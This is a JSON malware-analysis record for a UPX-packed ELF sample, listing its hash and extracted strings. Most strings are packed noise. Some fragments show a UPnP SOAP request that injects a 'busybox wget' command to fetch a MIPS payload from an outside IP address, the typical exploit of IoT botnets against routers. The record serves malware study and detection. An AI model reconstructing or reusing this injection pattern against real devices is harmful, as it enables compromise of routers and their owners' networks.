{
    "malware_data": [
        {
            "filename": "ac53d53635f57cf0c9a7eff121db766e19e762492933e45b09eb210710cda753.elf",
            "filetype": "7F454C46",
            "filesize": "32KB",
            "hash_sha256": "ac53d53635f57cf0c9a7eff121db766e19e762492933e45b09eb210710cda753",
            "strings": [
                " UPX!",
                "P\\A7",
                "+%\\$",
                " A(L",
                "=t <",
                "{x`1",
                " q/!",
                "w$58@H",
                "<PX`h",
                "\"[aK",
                "E;a;(",
                "<;#'(",
                "YEEt",
                "G&:V",
                "Dsta",
                "r$O&",
                "r!GV?",
                "4/-@<",
                "+mf@.",
                "=; 6",
                "IB :!",
                "VAUAT",
                "O,o*",
                ",13HB",
                "(s<f'>",
                "/&xT",
                "[]A\\A",
                "A@BH",
                "@[LBP1",
                "~2&A",
                "C^f-",
                "~4~Hg4",
                "WjQ;0",
                "L.T5",
                " *j6",
                "'*98",
                "&H>08",
                "IFT ",
                "99y000@",
                " _OGm",
                "FHH-",
                "D&KY",
                "k{;J<",
                "r8G\\",
                "X |z",
                "O(>l-m",
                "#l:[1",
                "O\"%a",
                "B@XEW",
                "C3q+l",
                "C&is",
                "w9&<",
                "[0 $_",
                "@!.D",
                "Ph,%1",
                "H;X%9",
                "dsM8.",
                "iPb\"",
                "LbYWbf$p",
                "$OFh$",
                "}tB8",
                "x'#2",
                "h#i$#",
                "!C>?=",
                "Tn^v",
                "0DTr",
                "=9y0",
                ")7<)C8L",
                "@)O4",
                ")j )z",
                ")1)1 Q@",
                "0?0K^",
                "/Y/e",
                "/q/}",
                "j0/U",
                "\"]:/",
                "BY|qT?",
                "<$0o",
                "XuAx",
                "E'xx",
                "k{f ",
                "Z y 6",
                "iO (;",
                " M $ ",
                "A57+",
                "Ar@<]",
                "bgo8",
                "Aw44",
                " WA\"",
                "%AAA",
                "DF4l",
                "\"A3&AJ",
                "4*6O",
                "C&@T",
                "6:x0",
                "<1:Q",
                "N43VFF",
                "A3$Ez",
                "BuHDF2",
                "D$a%",
                "@@'E^",
                "d[24",
                "f@3]",
                "Cs,p",
                "M0Q=",
                "Cij)L",
                "x(~P0bD[$$",
                "z=MY6",
                "O[Yn",
                "Ds_9C`",
                "%9J)",
                "! G6",
                "7r4<iX",
                "3kEH",
                "/prof",
                "/exe",
                "]z,u",
                "odC{|",
                "TYAtO:Fpv",
                "Td9-C",
                "as 8",
                ".?~'",
                " Z(_",
                "FFzH",
                "KO/-",
                "%_'n",
                "\\{W1",
                "~=^V",
                "FSzH",
                "W@+[(",
                "C-h1",
                "+NS?",
                "lE@,",
                "p?U{,R",
                "\"T5W",
                "08@ ",
                "2 HP2 ",
                "2X`h",
                "{Mt;a",
                "$~{9",
                "PDJD?D7",
                "etG|",
                "<t[5",
                "dddd6,.$dddd&",
                "t/t ",
                "Tk!@",
                "f@${RP",
                "@08zF",
                "V1.)W",
                "IPO!",
                " nX>s",
                "sqH>X",
                "c7(< 't",
                "Tk,N",
                "1jD{",
                "jVEem",
                "9HKI",
                "-&>H",
                "u*Hg",
                "6Pjs",
                "R,|ti",
                "t+@):",
                "[[ax3",
                "@XO-l",
                "@E*M",
                " C n",
                "'Y ^",
                "Y ((",
                "88@@H",
                "HXXhhPn",
                "iP``ppX[",
                "Q}_0",
                "pUDjQK",
                "E.\\$",
                "g0SA",
                "|/2CW",
                "3\":&",
                "?SRB<",
                "QG*1",
                "tUIaV",
                "yz-E",
                "I+@[8",
                "ub+w",
                "#T>c",
                ".Gun",
                "~SUt",
                "V\"6p",
                "{Aa)",
                "Dm{8",
                "Y}Hp",
                "9LtM",
                "+1?R",
                "Ewpz",
                "OP80s",
                "D;G ",
                "8t#'",
                "7mtV",
                "_eMF",
                "`sE%*iht\"",
                "<.2z",
                "v.fU^",
                "8zHU%",
                "w[Z0",
                "z0-E",
                "m'@$",
                ";[Q_h,_B",
                "@OT5:7",
                "f5+^",
                "`s]P",
                "08u@<",
                " (0-$<",
                "sYH1",
                ",=#nf",
                "t %']",
                "s~I1",
                "6us9",
                "0RKI",
                "K.zoYK&",
                "((  ",
                "t]rG",
                "J[Xs",
                "_(tr4*:\"",
                "\"($(",
                "FK}0",
                "1Y2lQ",
                "L]jR",
                "PxX1%S-U",
                "\">AK",
                "#>mN",
                "\\Ec#",
                "T+*,Id_)3",
                ";P*(LZ",
                "8`/u",
                "L(T%",
                "nkF<",
                "([w=",
                "p%t;-=",
                "leJQ",
                "0JO0",
                "G\"<:",
                "-=:A",
                "V,k~&",
                "EE@@",
                "JL;5y#",
                ".-8^",
                "ua43t",
                ".DD=",
                "L#d.",
                ",{Cs",
                "Ic#C.N",
                "v<32H",
                ")BpN",
                "fmuq!t}",
                "h1\\6BR",
                "%#[2ZX{",
                "fC[*>&",
                " v%()(0",
                "UM^_",
                "<PCZ",
                "pky19",
                "hEle4P",
                "N4Qt[",
                "!VdB",
                "SEdC",
                "ZA0h",
                " &t%",
                "j.A-Iu",
                "sTO7E",
                "Es`t\\",
                "MtN6",
                "K`D]i",
                "tyI-",
                "`C@\\h/5",
                "]Cd`",
                "V,K\"",
                "\\tiB",
                "(rN;",
                "bL9@",
                "G;Y_7",
                "=o!nYo",
                "v[Nt",
                "n;$r0",
                "UI3!",
                "snpM-",
                "|a(DCT",
                "?Y#,",
                "~N t\"17",
                "l~OO(",
                "-FS#(/vx",
                "_(HS0",
                "t}n,",
                "5d!p",
                "*vu$!",
                "KVE8",
                "(OIA3",
                "pxu ",
                "5' *",
                "1*31@'<e*",
                "E?gB",
                "M*^I",
                "}4w?q`",
                ":p(Au",
                "Y{l'k",
                "#'T\"H",
                "LZls(\\",
                "A*tE0",
                "HEA5#5I",
                "@W*nk",
                "+9)U)",
                "iAfmj",
                "tA`)",
                "VeS u",
                "wqpOce",
                "u#z!",
                "u=z;[",
                "1$H1",
                "E_^j",
                "~b;6(",
                "`iX!",
                "bm#h=206",
                "0A}_v",
                "0D+(K",
                "vJFu",
                "Ql,cQ",
                "@87r",
                "a*{e",
                "tW47",
                "#/1Y",
                ".udbs",
                "!A}YA",
                "x`'M",
                "G8T!",
                "bp$2#",
                "}oP!",
                "]eC#",
                "dEH'E",
                "<?xml versionu",
                "=\"1.0\" ?><s:En",
                "lope ",
                "htc://schemas.",
                "soap.org/",
                "/e1/A",
                "codingStyle;",
                ".;{B",
                "u:Upgrad",
                "uurn:C",
                "-upnp-@",
                "vice:",
                "WANP",
                "nect",
                ":1LNk7",
                "atusURL>U/bd",
                "usybox wget -g 193.23",
                ".mips; ",
                "lfre",
                "0wei)</",
                "Down",
                "|WEIUP",
                "POST",
                "~;_1^TTP/1",
                "= ke",
                "-aliE",
                "t: */*ut",
                "riza'Di",
                "6s7uvnam",
                "Ho G7",
                "w[way",
                "n#c/88645",
                "b1f9e",
                "0ez6",
                "569d75",
                "30)un'",
                "vlbspJs8",
                "f843a42db38f4",
                "5F2aMs",
                "[x97e",
                "t-Le",
                "@%s/",
                "opth",
                "varsK.",
                "#on)mnroot/null",
                "ae.l!",
                "chdog",
                "misc",
                "_|a~",
                "abc.fghijklmnop",
                "qrstuvw012345678'vqMWPAG_",
                "gLEKL",
                "sWGP[\"",
                "QJGNNGLC@",
                "[QVGO",
                "@KLW~",
                "okpck",
                "DULF",
                "LAMPPG",
                "<H>`",
                "(nil)v",
                "'hlLjztq",
                "{npx",
                "XoudifFeEgGaACScs+0-#'I",
                "9\"4Unkn",
                "KE eror ",
                "Ptte",
                ";No s\"h f>e 9",
                "AInt\\up5",
                "VaddrDArV",
                "gumi licgkm",
                "vmaBB1",
                "riuVT",
                "y unav`",
                "2\\'mvh",
                "cG-A",
                "Ga/Tk",
                "Bap(v",
                "Z&%5Il",
                "ek|0-^",
                "^fo2. \\",
                "/bm.a",
                "IUjv",
                "e,qvdCh",
                "&Lc 2~e",
                "]iz4",
                "Ift[B",
                "-sTp",
                "th[Aw",
                "in*Lbj",
                "s)sAd6X",
                "Comm",
                "}-ndJ;",
                "[RFS",
                "F^Nb_",
                "lZlY",
                "\"doD",
                "`[!5",
                "BT<dy",
                "HgnA",
                "8ce]s",
                "or`Vr'",
                "ENIX",
                "c;k[",
                "dC6$",
                "\\Wd0",
                "L(kna",
                "ZtON6",
                "dyUg",
                "CAk[S",
                "USQRH",
                "PROT_EXEC|PROT_WRITE failed.",
                "$Info: This file is packed with the UPX executable packer http://upx.sf.net $",
                "$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $",
                "_j<X",
                "j2AZE)",
                "/proc/self/exe",
                "IuDSWH",
                "s2V^",
                "Y^_H",
                "pW*)",
                "DOt$",
                "UPX!u",
                "([]A\\A]",
                "BY8k",
                "AVJG",
                "USAhL",
                "(DDA",
                "@bQsA",
                "IA `",
                "?;Iy",
                "NyOt",
                ";lBs&G",
                "hA^A_",
                "vxp\\",
                "a;8+",
                ".shstrtab",
                "init",
                "roda",
                "ctors",
                "@(Cra'",
                ",HH&C2",
                "UPX!"
            ]
        }
    ]
}